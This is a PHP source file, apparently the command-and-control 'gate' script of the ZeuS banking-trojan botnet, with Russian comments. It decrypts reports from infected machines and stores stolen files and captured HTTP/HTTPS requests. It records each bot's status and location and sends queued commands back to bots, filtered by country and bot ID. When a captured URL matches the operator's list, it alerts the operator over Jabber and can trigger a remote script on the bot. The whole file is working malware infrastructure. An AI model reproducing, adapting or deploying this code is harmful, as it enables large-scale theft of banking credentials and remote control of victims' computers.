<?php define('__REPORT__', 1);
/*
  Гейт.
  
  Протокол бот <-> сервер представляет из себя со стороны бота - отсылка отчета о чем либо,
  а со стороны сервера - отправка изменений в настройках( или команды). Со стороны бота, за раз
  отправляется информация об одном событие/объекте.
*/

if(@$_SERVER['REQUEST_METHOD'] !== 'POST')die();
require_once('system/global.php');
require_once('system/config.php');

//Получаем данные.
$data     = @file_get_contents('php://input');
$dataSize = @strlen($data);
if($dataSize < HEADER_SIZE + ITEM_HEADER_SIZE)die();
rc4($data, $config['botnet_cryptkey_bin']);
visualDecrypt($data);

//Верефикация. Если совпадает MD5, нет смысла проверять, что-то еще.
if(strcmp(md5(substr($data, HEADER_SIZE), true), substr($data, HEADER_MD5, 16)) !== 0)die();

//Парсим данные (Сжатие данных не поддерживается).
//Поздравляю мега хакеров, этот алгоритм позволит вам спокойно читать данные бота. Не забудьте написать 18 парсеров и 100 бэкдоров.
$list = array();
for($i = HEADER_SIZE; $i < $dataSize;)
{
  $k = @unpack('L4', @substr($data, $i, ITEM_HEADER_SIZE));
  $list[$k[1]] = @substr($data, $i + ITEM_HEADER_SIZE, $k[3]);
  $i += (ITEM_HEADER_SIZE + $k[3]);
}
unset($data);

//Основные параметры, которые должны быть всегда.
if(empty($list[SBCID_BOT_VERSION]) || empty($list[SBCID_BOT_ID]))die();

//Подключаемся к базе.
if(!connectToDb())die();

///////////////////////////////////////////////////////////////////////////////////////////////////
// Обрабатываем данные.
///////////////////////////////////////////////////////////////////////////////////////////////////

$botId      = str_replace("\x01", "\x02", trim($list[SBCID_BOT_ID]));
$botIdQ     = addslashes($botId);
$botnet     = (empty($list[SBCID_BOTNET])) ? DEFAULT_BOTNET : str_replace("\x01", "\x02", trim($list[SBCID_BOTNET]));
$botnetQ    = addslashes($botnet);
$botVersion = toUint($list[SBCID_BOT_VERSION]);
$realIpv4   = trim((!empty($_GET['ip']) ? $_GET['ip'] : $_SERVER['REMOTE_ADDR']));
$country    = getCountryIpv4(); //str_replace("\x01", "\x02", GetCountryIPv4());
$countryQ   = addslashes($country);
$curTime    = time();

//Отчет об исполнении скрипта.
if(!empty($list[SBCID_SCRIPT_ID]) && isset($list[SBCID_SCRIPT_STATUS], $list[SBCID_SCRIPT_RESULT]) && strlen($list[SBCID_SCRIPT_ID]) == 16)
{
  if(!mysqlQueryEx('botnet_scripts_stat',
                   "INSERT INTO `botnet_scripts_stat` SET `bot_id`='{$botIdQ}', `bot_version`={$botVersion}, `rtime`={$curTime}, ".
                   "`extern_id`='".addslashes($list[SBCID_SCRIPT_ID])."',".
                   "`type`=".(toInt($list[SBCID_SCRIPT_STATUS]) == 0 ? 2 : 3).",".
                   "`report`='".addslashes($list[SBCID_SCRIPT_RESULT])."'"))die();
}
//Запись логов/файлов.
else if(!empty($list[SBCID_BOTLOG]) && !empty($list[SBCID_BOTLOG_TYPE]))
{
  $type = toInt($list[SBCID_BOTLOG_TYPE]);
  
  if($type == BLT_FILE)
  {
    //Расширения, которые представляют возможность удаленного запуска.
    $bad_exts = array('.php3', '.php4', '.php5', '.php', '.asp', '.aspx', '.exe', '.pl', '.cgi', '.cmd', '.bat', '.phtml', '.htaccess');
    $fd_hash  = 0;
    $fd_size  = strlen($list[SBCID_BOTLOG]);
    
    //Формируем имя файла.
    if(isHackNameForPath($botId) || isHackNameForPath($botnet))die();
    $file_root = $config['reports_path'].'/files/'.urlencode($botnet).'/'.urlencode($botId);
    $file_path = $file_root;
    $last_name = '';
    $l = explode('/', (isset($list[SBCID_PATH_DEST]) && strlen($list[SBCID_PATH_DEST]) > 0 ? str_replace('\\', '/', $list[SBCID_PATH_DEST]) : 'unknown'));
    foreach($l as &$k)
    {
      if(isHackNameForPath($k))die();
      $file_path .= '/'.($last_name = urlencode($k));
    }
    if(strlen($last_name) === 0)$file_path .= '/unknown.dat';
    unset($l);
    
    //Проверяем расширении, и указываем маску файла.
    if(($ext = strrchr($last_name, '.')) === false || in_array(strtolower($ext), $bad_exts) !== false)$file_path .= '.dat';
    $ext_pos = strrpos($file_path, '.');
    
    //FIXME: Если имя слишком большое.
    if(strlen($file_path) > 180)$file_path = $file_root.'/longname.dat';
    
    //Добавляем файл.
    for($i = 0; $i < 9999; $i++)
    { 
      if($i == 0)$f = $file_path;
      else $f = substr_replace($file_path, '('.$i.').', $ext_pos, 1);
      
      if(file_exists($f))
      {
        if($fd_size == filesize($f))
        {
          if($fd_hash === 0)$fd_hash = md5($list[SBCID_BOTLOG], true);
          if(strcmp(md5_file($f, true), $fd_hash) === 0)break;
        }
      }
      else
      {
        if(!createDir(dirname($file_path)) || !($h = fopen($f, 'wb')))die();
        
        flock($h, LOCK_EX);
        fwrite($h, $list[SBCID_BOTLOG]);
        flock($h, LOCK_UN);
        fclose($h);
        
        break;
      }
    }
  }
  else
  {
    //Запись в базу.
    if($config['reports_to_db'] === 1)
    {
      $table = 'botnet_reports_'.gmdate('ymd', $curTime);
      $query = "INSERT DELAYED INTO `{$table}` SET `bot_id`='{$botIdQ}', `botnet`='{$botnetQ}', `bot_version`={$botVersion}, `type`={$type}, `country`='{$countryQ}', `rtime`={$curTime},".
               "path_source='".  (empty($list[SBCID_PATH_SOURCE])    ? '' : addslashes($list[SBCID_PATH_SOURCE]))."',".
               "path_dest='".    (empty($list[SBCID_PATH_DEST])      ? '' : addslashes($list[SBCID_PATH_DEST]))."',".
               "time_system=".   (empty($list[SBCID_TIME_SYSTEM])    ? 0  : toUint($list[SBCID_TIME_SYSTEM])).",".
               "time_tick=".     (empty($list[SBCID_TIME_TICK])      ? 0  : toUint($list[SBCID_TIME_TICK])).",".
               "time_localbias=".(empty($list[SBCID_TIME_LOCALBIAS]) ? 0  : toInt($list[SBCID_TIME_LOCALBIAS])).",".
               "os_version='".   (empty($list[SBCID_OS_INFO])        ? '' : addslashes($list[SBCID_OS_INFO]))."',".
               "language_id=".   (empty($list[SBCID_LANGUAGE_ID])    ? 0  : toUshort($list[SBCID_LANGUAGE_ID])).",".
               "process_name='". (empty($list[SBCID_PROCESS_NAME])   ? '' : addslashes($list[SBCID_PROCESS_NAME]))."',".
               "process_user='". (empty($list[SBCID_PROCESS_USER])   ? '' : addslashes($list[SBCID_PROCESS_USER]))."',".
               "ipv4='".          addslashes($realIpv4)."',".
               "context='".       addslashes($list[SBCID_BOTLOG])."'";

      //Думаю такой порядок повышает производительность.
      if(!mysqlQueryEx($table, $query) && (!@mysql_query("CREATE TABLE IF NOT EXISTS `{$table}` LIKE `botnet_reports`") || !mysqlQueryEx($table, $query)))die();
    }
    
    //Запись в файл.
    if($config['reports_to_fs'] === 1)
    {
      if(isHackNameForPath($botId) || isHackNameForPath($botnet))die();
      $file_path = $config['reports_path'].'/other/'.urlencode($botnet).'/'.urlencode($botId);
      if(!createDir($file_path) || !($h = fopen($file_path.'/reports.txt', 'ab')))die();
      
      flock($h, LOCK_EX);
      fwrite($h, str_repeat("=", 80)."\r\n".
                 "bot_id={$botId}\r\n".
                 "botnet={$botnet}\r\n".
                 "bot_version=".intToVersion($botVersion)."\r\n".
                 "ipv4={$realIpv4}\r\n".
                 "country={$country}\r\n".
                 "type={$type}\r\n".
                 "rtime=".         gmdate('H:i:s d.m.Y', $curTime)."\r\n".
                 "time_system=".   (empty($list[SBCID_TIME_SYSTEM])    ? 0  : gmdate('H:i:s d.m.Y', toInt($list[SBCID_TIME_SYSTEM])))."\r\n".//time() тоже возращает int.
                 "time_tick=".     (empty($list[SBCID_TIME_TICK])      ? 0  : tickCountToText(toUint($list[SBCID_TIME_TICK]) / 1000))."\r\n".
                 "time_localbias=".(empty($list[SBCID_TIME_LOCALBIAS]) ? 0  : timeBiasToText(toInt($list[SBCID_TIME_LOCALBIAS])))."\r\n".
                 "os_version=".    (empty($list[SBCID_OS_INFO])        ? '' : osDataToString($list[SBCID_OS_INFO]))."\r\n".
                 "language_id=".   (empty($list[SBCID_LANGUAGE_ID])    ? 0  : toUshort($list[SBCID_LANGUAGE_ID]))."\r\n".
                 "process_name=".  (empty($list[SBCID_PROCESS_NAME])   ? '' : $list[SBCID_PROCESS_NAME])."\r\n".
                 "process_user=".  (empty($list[SBCID_PROCESS_USER])   ? '' : $list[SBCID_PROCESS_USER])."\r\n".
                 "path_source=".   (empty($list[SBCID_PATH_SOURCE])    ? '' : $list[SBCID_PATH_SOURCE])."\r\n".
                 "context=\r\n".   $list[SBCID_BOTLOG]."\r\n\r\n\r\n");
      flock($h, LOCK_UN);
      fclose($h);
    }
   if($config['reports_jn'] === 1)imNotify($type, $list, $botId);
  }
}
//Отчет об онлайн-статусе.
else if(!empty($list[SBCID_NET_LATENCY]))
{
  //Стандартный запрос.
  $query = "`bot_id`='{$botIdQ}', `botnet`='{$botnetQ}', `bot_version`={$botVersion}, `country`='{$countryQ}', `rtime_last`={$curTime}, ".
           "`net_latency`=".   (empty($list[SBCID_NET_LATENCY])    ? 0  : toUint($list[SBCID_NET_LATENCY])).", ".
           "`tcpport_s1`=".    (empty($list[SBCID_TCPPORT_S1])     ? 0  : toUshort($list[SBCID_TCPPORT_S1])).", ".
           "`time_localbias`=".(empty($list[SBCID_TIME_LOCALBIAS]) ? 0  : toInt($list[SBCID_TIME_LOCALBIAS])).", ".
           "`os_version`='".   (empty($list[SBCID_OS_INFO])        ? '' : addslashes($list[SBCID_OS_INFO]))."', ".
           "`language_id`=".   (empty($list[SBCID_LANGUAGE_ID])    ? 0  : toUshort($list[SBCID_LANGUAGE_ID])).", ".
           "`ipv4_list`='".    (empty($list[SBCID_IPV4_ADDRESSES]) ? '' : addslashes($list[SBCID_IPV4_ADDRESSES]))."', ".
           "`ipv6_list`='".    (empty($list[SBCID_IPV6_ADDRESSES]) ? '' : addslashes($list[SBCID_IPV6_ADDRESSES]))."', ".
           "`ipv4`='".         addslashes(pack('N', ip2long($realIpv4)))."'";

  if(!mysqlQueryEx('botnet_list',
                   "INSERT INTO `botnet_list` SET `comment`='', `rtime_first`={$curTime}, `rtime_online`={$curTime}, {$query} ".
                   "ON DUPLICATE KEY UPDATE `rtime_online`=IF(`rtime_last` <= ".($curTime - $config['botnet_timeout']).", {$curTime}, `rtime_online`), {$query}"))die();
  unset($query);
  
  //Поиск скриптов для отправки.
  $replyData  = '';
  $replyCount = 0;

  $botIdQm   = toSqlSafeMask($botIdQ);
  $botnetQm  = toSqlSafeMask($botnetQ);
  $countryQm = toSqlSafeMask($countryQ);

  $r = mysqlQueryEx('botnet_scripts',
                    "SELECT `extern_id`, `script_bin`, `send_limit`, `id` FROM `botnet_scripts` WHERE `flag_enabled`=1 AND ".
                    "(`countries_wl`='' OR `countries_wl` LIKE BINARY '%\x01{$countryQm}\x01%') AND ".
                    "(`countries_bl` NOT LIKE BINARY '%\x01{$countryQm}\x01%') AND ".
                    "(`botnets_wl`='' OR `botnets_wl` LIKE BINARY '%\x01{$botnetQm}\x01%') AND ".
                    "(`botnets_bl` NOT LIKE BINARY '%\x01{$botnetQm}\x01%') AND ".
                    "(`bots_wl`='' OR `bots_wl` LIKE BINARY '%\x01{$botIdQm}\x01%') AND ".
                    "(`bots_bl` NOT LIKE BINARY '%\x01{$botIdQm}\x01%') ".
                    "LIMIT 10");

  if($r)while(($m = mysql_fetch_row($r)))
  {
    $eid = addslashes($m[0]);
    
    //Проверяем, не достигнут ли лимит.
    if($m[2] != 0 && ($j = mysqlQueryEx('botnet_scripts_stat', "SELECT COUNT(*) FROM `botnet_scripts_stat` WHERE `type`=1 AND `extern_id`='{$eid}'")) && ($c = mysql_fetch_row($j)) && $c[0] >= $m[2])
    {
      mysqlQueryEx('botnet_scripts', "UPDATE `botnet_scripts` SET `flag_enabled`=0 WHERE `id`={$m[3]} LIMIT 1");
      continue;
    }
    
    //Добовляем бота в список отправленных.
    if(mysqlQueryEx('botnet_scripts_stat', "INSERT HIGH_PRIORITY INTO `botnet_scripts_stat` SET `extern_id`='{$eid}', `type`=1, `bot_id`='{$botIdQ}', `bot_version`={$botVersion}, `rtime`={$curTime}, `report`='Sended'"))
    {
      $size = strlen($m[1]) + strlen($m[0]);
      $replyData .= pack('LLLL', ++$replyCount, 0, $size, $size).$m[0].$m[1];
    }
  }

  if($replyCount > 0)
  {
    $replyData = pack('LLLLLLLL', mt_rand(), mt_rand(), mt_rand(), mt_rand(), mt_rand(), HEADER_SIZE + strlen($replyData), 0, $replyCount).md5($replyData, true).$replyData;
    visualEncrypt($replyData);
    rc4($replyData, $config['botnet_cryptkey_bin']);
    echo $replyData;
    die();
  }
}
else die();

//Отправляем пустой ответ.
sendEmptyReply();

///////////////////////////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Отправка пустого ответа и выход.
*/
function sendEmptyReply()
{
  $replyData = pack('LLLLLLLL', mt_rand(), mt_rand(), mt_rand(), mt_rand(), mt_rand(), HEADER_SIZE + ITEM_HEADER_SIZE, 0, 1)."\x4A\xE7\x13\x36\xE4\x4B\xF9\xBF\x79\xD2\x75\x2E\x23\x48\x18\xA5\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
  visualEncrypt($replyData);
  rc4($replyData, $GLOBALS['config']['botnet_cryptkey_bin']);
  echo $replyData;
  die();
}

/*
  Получение страны.
  
  Return - string, страна.
*/
function getCountryIpv4()
{
  $ip = sprintf('%u', ip2long($GLOBALS['realIpv4']));
  if(($r = @mysql_query("SELECT `c` FROM `ipv4toc` WHERE `l`<='".$ip."' AND `h`>='".$ip."' LIMIT 1")) && ($m = mysql_fetch_row($r)) !== false)return $m[0];
  else return '--';
}

/*
  Ковертация Bin2UINT.
  
  IN $str - string, исходная бинарная строка.

  Return  - int, сконвертированное число.
*/
function toUint($str)
{
  $q = @unpack('L', $str);
  return is_array($q) && is_numeric($q[1]) ? ($q[1] < 0 ? sprintf('%u', $q[1]) : $q[1]) : 0;
}

/*
  Ковертация Bin2INT.

  IN $str - string, исходная бинарная строка.

  Return  - int, сконвертированное число.
*/
function toInt($str)
{
  $q = @unpack('l', $str);
  return is_array($q) && is_numeric($q[1]) ? $q[1] : 0;
}

/*
  Ковертация Bin2SHORT.

  IN $str - string, исходная бинарная строка.

  Return  - int, сконвертированное число.
*/
function toUshort($str)
{
  $q = @unpack('S', $str);
  return is_array($q) && is_numeric($q[1]) ? $q[1] : 0;
}

/*
  Проверяет, является ли имя увязимым как часть пути.
  
  IN $name - string, имя для проверки.
  
  Return   - true - если имя увязьмо,
             false - если не увязьимо.
*/
function isHackNameForPath($name)
{
  $len = strlen($name);
  return ($len > 0 && substr_count($name, '.') < $len && strpos($name, '/') === false && strpos($name, "\\") === false && strpos($name, "\x00") === false) ? false : true;
}
/*
  Отправка данных об отчете в IM.
  
  IN   - int, тип отчета.
  IN   - array, данные отчета.
  IN  - string, ID бота.
*/
function imNotify(&$type, &$list, &$botId)
{
  if(($type == BLT_HTTP_REQUEST || $type == BLT_HTTPS_REQUEST) && !empty($list[SBCID_PATH_SOURCE]))
  {
    $ml = explode("\x01", $GLOBALS['config']['reports_jn_list']);
    foreach($ml as &$mask)
    {
      if(@preg_match('#^'.str_replace('\\*', '.*', preg_quote($mask, '#')).'$#i', $list[SBCID_PATH_SOURCE]) > 0)
      {  
        $message = htmlentities("Bot ID: ".$botId."\nURL: ".$list[SBCID_PATH_SOURCE]."\n\n".substr($list[SBCID_BOTLOG], 0, 1024));

        error_reporting(0);

        if(strlen($GLOBALS['config']['reports_jn_logfile']) > 0 && ($fh = @fopen($GLOBALS['config']['reports_jn_logfile'], 'at')) !== false)
        {
          @fwrite($fh, $message."\n\n".str_repeat('=', 40)."\n\n");
          @fclose($fh);
        }

        require_once("system/jabberclass.php");
        $jab = new Jabber;

        $jab->server   = $GLOBALS['config']['reports_jn_server'];
        $jab->port     = $GLOBALS['config']['reports_jn_port'];
        $jab->username = $GLOBALS['config']['reports_jn_account'];
        $jab->password = $GLOBALS['config']['reports_jn_pass'];

        if($jab->connect())
        {
          $jab->sendAuth();
          $jab->sendPresence(NULL, NULL, "online");
          $jab->sendMessage($GLOBALS['config']['reports_jn_to'], "normal", NULL, array("body" => $message));
          $jab->disconnect();
        }

        if(strlen($GLOBALS['config']['reports_jn_script']) > 0)
        {
          $eid       = md5($mask, true);
          $script    = 'user_execute "'.trim($GLOBALS['config']['reports_jn_script']).'" -f';
          $size      = strlen($eid) + strlen($script);
          $replyData = pack('LLLL', 1, 0, $size, $size).$eid.$script;
          $replyData = pack('LLLLLLLL', mt_rand(), mt_rand(), mt_rand(), mt_rand(), mt_rand(), HEADER_SIZE + strlen($replyData), 0, 1).md5($replyData, true).$replyData;

          visualEncrypt($replyData);
          rc4($replyData, $GLOBALS['config']['botnet_cryptkey_bin']);
          echo $replyData;
          die();
        }
        break;
      }
    }
  }
}
?>